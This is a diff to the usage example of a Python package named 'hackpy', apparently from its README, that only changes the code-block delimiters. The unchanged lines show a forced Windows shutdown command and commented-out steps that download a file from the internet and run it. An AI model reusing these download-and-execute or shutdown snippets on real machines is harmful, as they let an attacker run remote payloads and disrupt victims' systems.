@@ -1,5 +1,5 @@
 # pip install hackpy
-'''
+``` python
 import os, sys
 import hackpy
 
@@ -43,4 +43,4 @@ hackpy.system('shutdown -s -t 3600')
 # Load and execute file from internet
 # file = hackpy.wget(direct.link.here)
 # hackpy.start(file)
-'''
+```
